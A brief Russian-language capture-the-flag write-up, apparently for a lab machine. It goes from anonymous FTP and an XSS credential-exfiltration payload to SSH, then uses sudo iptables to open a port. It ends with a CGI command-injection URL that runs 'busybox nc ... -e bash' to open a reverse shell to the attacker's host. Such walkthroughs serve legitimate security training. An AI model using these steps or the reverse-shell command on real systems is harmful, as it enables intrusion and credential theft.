После сканирование тачки видим открытые 21,22,80 порт
на 21 порт можно зайти под анонимным пользователем

![](../attachment/Pasted%20image%2020250602184836.png)
Скачиваем файл и видим что данные пользователя хранятся локально в /dir/pass.txt
![](../attachment/Pasted%20image%2020250602184922.png)

Изучив веб находим XSS которая может быть  в логине и отрабатывает когда оставляем комментарией
создадим скрипт который будет загружать файл с нашей тачки. В самом файле пропишем код [raw.githubusercontent.com/hoodoer/XSS-Data-Exfil/main/exfilPayload.js](https://raw.githubusercontent.com/hoodoer/XSS-Data-Exfil/main/exfilPayload.js) изменив нужные строки и получаем хеш в котором содержится логин:пароль

![](../attachment/Pasted%20image%2020250602184807.png)
![](../attachment/Pasted%20image%2020250602184932.png)

Подключаемся по ssh и получаем первый флаг
![](../attachment/Pasted%20image%2020250602184944.png)

![](../attachment/Pasted%20image%2020250602185000.png)

Изучив систему находим текстовой файл 
![](../attachment/Pasted%20image%2020250602185649.png)
 Видим закрытый порт, тк мы можем пользоваться iptables с sudo откроем порт и видим на сайте ошибку
![](../attachment/Pasted%20image%2020250602185729.png)

sudo /usr/sbin/iptables -L --line-numbers
 sudo /usr/sbin/iptables -D INPUT 1
 sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT

Скачиваем серты/ключи апач чтобы более подробно изучить pcap файл.
![](../attachment/Pasted%20image%2020250603091815.png)

Находим полную ссылку для взаимодействия с сервисом
![](../attachment/Pasted%20image%2020250602190537.png)
![](../attachment/Pasted%20image%2020250602190640.png)


Используем busybos для подключения и забираем флаг рут
https://10.10.38.40:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=busybox%20nc%2010.21.61.35%205555%20-e%20bash

![](../attachment/Pasted%20image%2020250602190905.png)